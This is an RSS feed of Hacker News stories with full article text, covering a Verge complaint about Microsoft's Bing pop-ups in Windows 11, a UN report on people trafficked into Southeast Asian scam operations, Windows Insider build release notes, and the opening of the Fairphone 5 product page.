<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 30 Aug 2023 14:00:05 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Microsoft is using malware-like pop-ups in Win11 to get people to ditch Chrome (178 pts)]]></title>
            <link>https://www.theverge.com/2023/8/30/23851902/microsoft-bing-popups-windows-11-malware</link>
            <guid>37321002</guid>
            <pubDate>Wed, 30 Aug 2023 12:29:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2023/8/30/23851902/microsoft-bing-popups-windows-11-malware">https://www.theverge.com/2023/8/30/23851902/microsoft-bing-popups-windows-11-malware</a>, See on <a href="https://news.ycombinator.com/item?id=37321002">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I thought I had malware on my main Windows 11 machine this weekend. There I was minding my own business in Chrome before tabbing back to a game and <em>wham</em> a pop-up appeared asking me to switch my default search engine to Microsoft Bing in Chrome. Stunningly, Microsoft now thinks it’s ok to shove a pop-up in my face above my apps and games just because I dare to use Chrome instead of Microsoft Edge.</p><p>This isn’t a normal notification, either. It didn’t appear in the notification center in Windows 11, nor is it connected to the part of Windows 11 that suggests new features to you. It’s quite literally a rogue executable file that has somehow appeared in c:\windows\temp\mubstemp and is digitally signed by Microsoft.</p><p>“We are aware of these reports and have paused this notification while we investigate and take appropriate action to address this unintended behavior,” says Caitlin Roulston, director of communications, in a statement to <em>The Verge</em>.</p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="The latest Bing popup appeared above the taskbar on Windows 11." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/376x212/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/384x216/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/415x233/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/480x270/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/540x304/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/640x360/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/750x422/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/828x466/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1080x608/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1200x675/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1440x810/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1920x1080/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/2048x1152/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/2400x1350/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/2400x1350/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883698/bingpopup0.jpeg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>The latest Bing popup appeared above the taskbar on Windows 11.</em></figcaption> <p><cite>Screenshot by Tom Warren / The Verge</cite></p></div></div><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="This annoying popup even appeared above a game." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/376x212/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/384x216/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/415x233/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/480x270/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/540x304/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/640x360/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/750x422/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/828x466/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1080x608/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1200x675/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1440x810/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/1920x1080/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/2048x1152/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/2400x1350/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:2560x1440/2400x1350/filters:focal(1280x720:1281x721):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24883699/bingpopup1.jpeg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>This annoying popup even appeared above a game.</em></figcaption> <p><cite>Screenshot by Tom Warren / The Verge</cite></p></div></div><p>I have no idea why Microsoft thinks it’s ok to fire off these pop-ups to Windows 11 users in the first place. I wasn’t alone in thinking it was malware, with posts dating back three months showing <a href="https://www.reddit.com/r/computerviruses/comments/149x25h/bgaupsell_what_is_this_bing_popup/">Reddit users trying to figure out</a> why they were seeing the pop-up.</p><p>I’m sure Microsoft is legally covered by the myriad of license agreements that nobody reads, but in reality I never knowingly consented to&nbsp;Microsoft&nbsp;abusing its ability to analyze my PC usage to show me a&nbsp;Bing&nbsp;pop-up just because I use Chrome with Google search.</p><p>This isn’t Microsoft’s first rodeo, either. I’m growing increasingly frustrated by the company’s methods of getting people to switch from Google and Chrome to Bing and Edge. Microsoft has been using a <a href="https://www.theverge.com/2021/12/2/22813733/microsoft-windows-edge-download-chrome-prompts">variety of prompts for years now</a>, with pop-ups appearing inside Chrome, on the Windows taskbar, and elsewhere. Microsoft has even <a href="https://www.theverge.com/21310611/microsoft-edge-browser-forced-update-chromium-editorial">forced people into Edge after a Windows Update</a>, and regularly presents a full-screen message to switch to Bing and Edge after updates.</p><p>Microsoft also started <a href="https://www.theverge.com/2023/6/6/23736289/microsoft-bing-chrome-search-fake-ai-chatbot">taking over Chrome searches in Bing</a> recently to deliver a canned response that looks like it’s generated from Microsoft’s GPT-4-powered chatbot. The fake AI interaction produced a full Bing page to entirely take over the search result for Chrome and convince Windows users to stick with Edge and Bing.</p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="Microsoft even took over Chrome search results in Bing recently." loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/376x204/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/384x209/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/415x226/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/480x261/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/540x294/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/640x348/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/750x408/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/828x450/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/1080x587/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/1200x653/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/1440x783/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/1920x1044/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/2048x1114/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/2400x1305/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:1920x1044/2400x1305/filters:focal(960x522:961x523):format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/24707688/chrome___Search___Personal___Microsoft__Edge_6_6_2023_3_52_36_PM.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>Microsoft even took over Chrome search results in Bing recently.</em></figcaption> <p><cite>Screenshot by Sean Hollister / The Verge</cite></p></div></div><p>You’ve probably never seen this latest pop-up or even some of the ones in the past, and that’s because Microsoft only experiments with a small number of Windows users before there’s an outcry and the company pivots to try and find another way to nag Windows users. Microsoft even <a href="https://www.theverge.com/2020/2/11/21133372/microsoft-search-chrome-extension-bing-default-search-plans-canceled">had to backtrack on plans</a> to force the Chrome default search to Bing for businesses installing its Office apps.</p><p>You might argue that this is Microsoft’s operating system, or that when using Microsoft’s browser and search engine it’s well within its rights to try and sway people away from Chrome. After all, Google runs similar notifications on its webpages to get people to use Chrome or it’s <a href="https://www.theverge.com/2019/11/23/20946114/google-youtube-premium-subscription-ads-pop-ups-spam-rant">annoying YouTube premium spam</a>. But Microsoft’s behaviors here are totally beyond a simple webpage prompt. I shouldn’t have to be dismissing pop-ups that appear on top of my apps and games, or ones that magically appear after I update my copy of Windows.</p><p>Windows isn’t freeware, it requires a license that almost every consumer ultimately pays for. That could be in the form of the price of a laptop that has a Windows OEM license baked in, or a product key if you built your own PC. Microsoft should respect the fact that people already pay for Windows and don’t want ads shoved down their throats. Windows is an important productivity tool for many people, and shouldn’t be treated like a cheap streaming box loaded with ads.</p><p>I truly hope Microsoft changes its ways here, but this has been going on in several different forms for years now so I’m just counting the days until the next annoying pop-up appears.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hundreds of thousands trafficked to work as online scammers in SE Asia (130 pts)]]></title>
            <link>https://www.ohchr.org/en/press-releases/2023/08/hundreds-thousands-trafficked-work-online-scammers-se-asia-says-un-report</link>
            <guid>37320975</guid>
            <pubDate>Wed, 30 Aug 2023 12:27:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ohchr.org/en/press-releases/2023/08/hundreds-thousands-trafficked-work-online-scammers-se-asia-says-un-report">https://www.ohchr.org/en/press-releases/2023/08/hundreds-thousands-trafficked-work-online-scammers-se-asia-says-un-report</a>, See on <a href="https://news.ycombinator.com/item?id=37320975">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong>GENEVA (29 August 2023)</strong> – Hundreds of thousands of people are being forcibly engaged by organised criminal gangs into online criminality in Southeast Asia - from romance-investment scams and crypto fraud to illegal gambling - a <a href="https://bangkok.ohchr.org/wp-content/uploads/2023/08/ONLINE-SCAM-OPERATIONS-2582023.pdf">report</a> issued today by the UN Human Rights Office shows.</p>

<p>Victims face a range of serious violations and abuses, including threats to their safety and security; and many have been subjected to torture and cruel, inhuman and degrading treatment or punishment, arbitrary detention, sexual violence, forced labour, and other human rights abuses, the report says.</p>

<p>“People who are coerced into working in these scamming operations endure inhumane treatment while being forced to carry out crimes. They are victims. They are not criminals,” said UN High Commissioner for Human Rights Volker Türk.</p>

<p>“In continuing to call for justice for those who have been defrauded through online criminality, we must not forget that this complex phenomenon has two sets of victims.”</p>

<p>The enormity of online scam trafficking in Southeast Asia is difficult to estimate, the reports says, because of the clandestine nature and gaps in the official response. Credible sources indicate that at least 120,000 people across Myanmar may be held in situations where they are forced to carry out online scams, with estimates in Cambodia similarly at around 100,000. Other States in the region, including Lao PDR, the Philippines and Thailand, have also been identified as main countries of destination or transit where at least tens of thousands of people have been involved.</p>

<p>The scam centres generate revenue amounting to billions of US dollars each year.</p>

<p>The COVID-19 pandemic and associated response measures had a drastic impact on illicit activities across the region. Public health measures closed casinos in many countries and in response, casino operators moved operations to less regulated spaces including conflict-affected border areas and Special Economic Zones, as well as to the increasingly lucrative online space, the report says.</p>

<p>Faced with new operational realities, criminal actors increasingly targeted migrants in vulnerable situations – who were stranded in these countries and out of work due to border and business closures – for recruitment into criminal operations, under the pretence of offering them real jobs. As COVID-related shutdowns saw millions of people restricted to their homes, spending more time online, there were more ready targets for online fraud schemes and more people susceptible to fraudulent recruitment.</p>

<p>Most people trafficked into the online scam operations are men, although women and adolescents are also among the victims, the report says. Most are not citizens of the countries in which the trafficking occurs. Many of the victims are well-educated, sometimes coming from professional jobs or with graduate or even post-graduate degrees, computer-literate and multi-lingual. Victims come from across the ASEAN region (from Indonesia, Lao PDR, Malaysia, Myanmar, Philippines, Singapore, Thailand and Vietnam), as well as mainland China, Hong Kong and Taiwan, South Asia, and even further afield from Africa and Latin America.</p>

<p>While some countries in Southeast Asia have put in place legal and policy frameworks relevant to counter trafficking, in some cases they fall short of international standards. In many cases their implementation has failed to respond adequately to the context and sophistication of these online scams, the report says.</p>

<p>Victims of trafficking and other human rights abuse are erroneously identified as criminals or as immigration offenders and, rather than being protected and given access to the rehabilitation and remedy they need, they are subjected to criminal prosecution or immigration penalties, it says.</p>

<p>“All affected States need to summon the political will to strengthen human rights and improve governance and the rule of law, including through serious and sustained efforts to tackle corruption. This must be as much a part of the response to these scams as a robust criminal justice response,” said Türk.</p>

<p>“Only such a holistic approach can break the cycle of impunity and ensure protection and justice for the people who have been so horrifically abused.”</p>

<p>To read the report, click <a href="https://bangkok.ohchr.org/wp-content/uploads/2023/08/ONLINE-SCAM-OPERATIONS-2582023.pdf">here</a></p>

<p>ENDS</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Windows 11 will respect default browser for system apps in the European Union (233 pts)]]></title>
            <link>https://blogs.windows.com/windows-insider/2023/08/25/announcing-windows-11-insider-preview-build-23531-dev-channel/</link>
            <guid>37320786</guid>
            <pubDate>Wed, 30 Aug 2023 12:07:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blogs.windows.com/windows-insider/2023/08/25/announcing-windows-11-insider-preview-build-23531-dev-channel/">https://blogs.windows.com/windows-insider/2023/08/25/announcing-windows-11-insider-preview-build-23531-dev-channel/</a>, See on <a href="https://news.ycombinator.com/item?id=37320786">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-js="panel-article-header">
					<p><span>
						<span>
							Written By
						</span>
						
					</span>
					<span>
						<span>
							published
						</span>
						<span>
							August 25, 2023
						</span>
					</span></p>
			</div><div data-index="0" data-js="panel" data-type="wysiwyg-with-aside" data-modular-content="" data-modular-content-collection="">
<p>Hello Windows Insiders, today we are releasing <strong>Windows 11 Insider Preview Build 23531 </strong>to the Dev Channel.</p>
<h2><strong>Changes and Improvements</strong></h2>
<h3><strong>[General]</strong></h3>
<ul>
<li><strong>[REMINDER] Insider Preview Build Expiration:</strong> The expiration date for Insider Preview builds flighted to the Dev Channel has been updated to 9/15/2024 starting with Build 23526. Please make sure you are updated to the latest build in the Dev Channel.</li>
<li>In the European Economic Area (EEA), Windows system components use the default browser to open links.</li>
</ul>
<h3><strong>[Search on the Taskbar]</strong></h3>
<ul>
<li>We’re re-introducing the search experience for invoking the search flyout when you hover over the search box gleam. This behavior can be adjusted by right-clicking on the taskbar, choosing “Taskbar settings” and adjusting your preferred search box experience.</li>
</ul>
<h2><strong>Fixes</strong></h2>
<h3><strong>[General]</strong></h3>
<ul>
<li>Fixed an issue which was causing explorer.exe to not work in safe mode.</li>
</ul>
<h3><strong>[File Explorer]</strong></h3>
<ul>
<li>Fixed an issue which could cause explorer.exe to crash when closing File Explorer.</li>
<li>Fixed an issue which was causing File Explorer to crash when navigating to Gallery if you had a large number of images.</li>
<li>Fixed an issue where “Automatically type into the Search Box” wasn’t working when File Explorer was open to Home.</li>
<li>Fixed an issue where if you tried to copy and paste, a file out of a compressed folder and into a OneDrive folder might fail with an error code.</li>
</ul>
<h3><strong>[HDR Backgrounds]</strong></h3>
<ul>
<li>Fixed an issue which could cause HDR wallpapers to appear washed out when HDR was enabled.</li>
</ul>
<h3><strong>[Task Manager]</strong></h3>
<ul>
<li>Fixed an issue where it wasn’t possible to move the Task Manager window with touch or pen.</li>
<li>Fixed an issue where Task Manager was crashing when using the reset to default button in Settings.</li>
<li>Fixed an issue which was causing sporadic crashes when using Task Manager, including when ending tasks.</li>
<li>Fixed an issue where if you did a search and then cleared it, the view would still be filtered even though there was no search anymore.</li>
<li>Fixed an issue where the search icon would become overlapped with the Task Manager text in the title bar.</li>
<li>Did some work to help improve the performance when switching between different pages in Task Manager.</li>
<li>Updated the summary view for the Performance page (that you see when double clicking the graphs in the navigation pane) to make the window smaller.</li>
</ul>
<p><em>NOTE: Some fixes noted here in Insider Preview builds from the Dev Channel may make their way into the servicing updates for the released version of Windows 11.</em></p>
<h2><strong>Known issues</strong></h2>
<h3><strong>[Start menu]</strong></h3>
<ul>
<li>Some apps under All apps on the Start menu, such as PWA apps installed via Microsoft Edge, may incorrectly be labeled as a system component.</li>
</ul>
<h3><strong>[Search on the Taskbar]</strong></h3>
<ul>
<li>Sometimes the tooltip when mousing over the search box does not match the current search highlight.</li>
</ul>
<h3><strong>[Input]</strong></h3>
<ul>
<li><strong>[ADDED 8/28]</strong> <a href="https://www.unicode.org/review/pri435/pri435-background-emoji-candidates.pdf">Unicode Emoji 15 </a>support which began rolling out with <a href="https://blogs.windows.com/windows-insider/2023/06/07/announcing-windows-11-insider-preview-build-23475/">Build 23475</a> and the updated color font format with&nbsp;<a href="https://learn.microsoft.com/typography/opentype/spec/colr#colr-version-1-rendering-algorithm">COLRv1</a> support that began rolling out with Build 23506 no longer appear after updating to <a href="https://blogs.windows.com/windows-insider/2023/08/25/announcing-windows-11-insider-preview-build-23531-dev-channel/">Build 23531</a> due to a bug. This issue will be fixed in a future flight soon.</li>
</ul>
<h3><strong>[Windows Copilot]</strong></h3>
<ul>
<li>You can use Alt + Tab to switch out of Windows Copilot, but not back into it. Windows + C will move focus back to Windows Copilot</li>
<li>When first launching or after refreshing Copilot while using voice access you’ll need to use “Show grid” commands to click in the “Ask me anything” box for the first time.</li>
</ul>
<h2><strong>For developers</strong></h2>
<p>You can download the latest Windows Insider SDK at&nbsp;<a href="https://aka.ms/windowsinsidersdk">aka.ms/windowsinsidersdk</a>.</p>
<p>SDK NuGet packages are now also flighting at <a href="https://www.nuget.org/profiles/WindowsSDK">NuGet Gallery | WindowsSDK</a> which include:</p>
<ul>
<li><a href="https://www.nuget.org/packages/Microsoft.Windows.SDK.NET.Ref/">.NET TFM packages</a> for use in .NET apps as described at <a href="https://aka.ms/windowsinsidersdk">aka.ms/windowsinsidersdk</a></li>
<li><a href="https://www.nuget.org/packages/Microsoft.Windows.SDK.CPP/">C++ packages</a> for Win32 headers and libs per architecture</li>
<li><a href="https://www.nuget.org/packages/Microsoft.Windows.SDK.BuildTools/">BuildTools package</a> when you just need tools like MakeAppx.exe, MakePri.exe, and SignTool.exe</li>
</ul>
<p>These NuGet packages provide more granular access to the SDK and better integration in CI/CD pipelines.</p>
<p><strong>SDK flights are now published for both the Canary and Dev Channels, so be sure to choose the right version for your Insider Channel.</strong></p>
<p>Remember to use&nbsp;<a href="https://learn.microsoft.com/windows/uwp/debug-test-perf/version-adaptive-apps">adaptive code&nbsp;</a>when targeting new APIs to make sure your app runs on all customer machines, particularly when building against the Dev Channel SDK.&nbsp;<a href="https://learn.microsoft.com/uwp/api/windows.foundation.metadata.apiinformation?view=winrt-22621">Feature detection</a>&nbsp;is recommended over OS version checks, as OS version checks are unreliable and will not work as expected in all cases.</p>
<h2><strong>About the Dev Channel</strong></h2>
<p><strong>REMINDER: </strong><a href="https://blogs.windows.com/windows-insider/2023/03/06/whats-coming-for-the-windows-insider-program-in-2023/"><strong>The Dev Channel has been rebooted</strong></a><strong>. Windows Insiders who were in the Dev Channel on 25000 series builds have been moved to the new Canary Channel. Going forward, the Dev Channel will receive 23000 series builds. Insiders who were moved to the Canary Channel and want to move back to the Dev Channel can </strong><a href="https://aka.ms/HowtoCleanInstall"><strong>follow these instructions</strong></a><strong> to do a clean installation of Windows 11 and then re-join the Dev Channel to receive 23000 series builds. </strong></p>
<p>The Dev Channel receives builds that represent long lead work from our engineers&nbsp;<strong>with features and experiences that may never get released</strong>&nbsp;as we try out different concepts and get feedback. It is important to remember that the builds we release to the Dev Channel should not be seen as matched to any specific release of Windows and the features included may change over time, be removed, or replaced in Insider builds or may never be released beyond Windows Insiders to general customers. For more information,&nbsp;<a href="https://blogs.windows.com/windows-insider/2022/02/03/whats-coming-for-the-windows-insider-program-in-2022/">please read this blog post</a>&nbsp;about how we plan to use the Dev Channel to incubate new ideas, work on long lead items, and control the states of individual features.</p>
<p>In some cases, features and experiences may go out to the Canary Channel first before going out to the Dev Channel however the Dev Channel will provide better platform stability. As we get closer to shipping, some features and experiences will also make their way to the Beta Channel when they are ready.</p>
<p><strong>The desktop watermark you see at the lower right corner of your desktop is normal for these pre-release builds.</strong></p>
<h2><strong>Important Insider Links</strong></h2>
<ul>
<li>You can <a href="https://aka.ms/wip-docs"><strong>check out our Windows Insider Program documentation here</strong></a>.</li>
<li>Check out <a href="https://aka.ms/flighthub"><strong>Flight Hub</strong></a> for a complete look at what build is in which Insider channel.</li>
</ul>
<p>Thanks,<br>
Amanda &amp; Brandon</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fairphone 5 (188 pts)]]></title>
            <link>https://shop.fairphone.com/fairphone-5</link>
            <guid>37319626</guid>
            <pubDate>Wed, 30 Aug 2023 09:58:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://shop.fairphone.com/fairphone-5">https://shop.fairphone.com/fairphone-5</a>, See on <a href="https://news.ycombinator.com/item?id=37319626">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="wrap">
            
            <div data-snippet="s_fp_wwwww_001" data-name="wwwww 001">
                    <p>
                    
                    <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/072.png" loading="eager"></p><div>
                        <h5>FAIRPHONE 5</h5>
                        <h2>
                            <span>Designed</span>
                            <span>for you.</span>
                            <span>Made fair.</span>
                        </h2>
                        <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/073.png" loading="eager"></p>
                    </div>
                </div>
            <div id="section1" data-snippet="s_fp_wwwww_002" data-name="wwwww 002">
                    <h3>Everything Fairphone&nbsp;5 in under a minute</h3>
                    <div>
                        <iframe title="vimeo-player" src="https://player.vimeo.com/video/857189404?controls=0" allow="autoplay" data-ready="true"></iframe>
                        </div>
                </div>
            <div data-snippet="s_fp_wwwww_003" data-name="wwwww 003">
                    <h2>Our most sustainable
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <br>phone yet
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    </h2>
                    <div id="fp_js_slider_2">
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/099.gif" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>Premium European Design in 3 colors
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            <br>
                                        </h5>
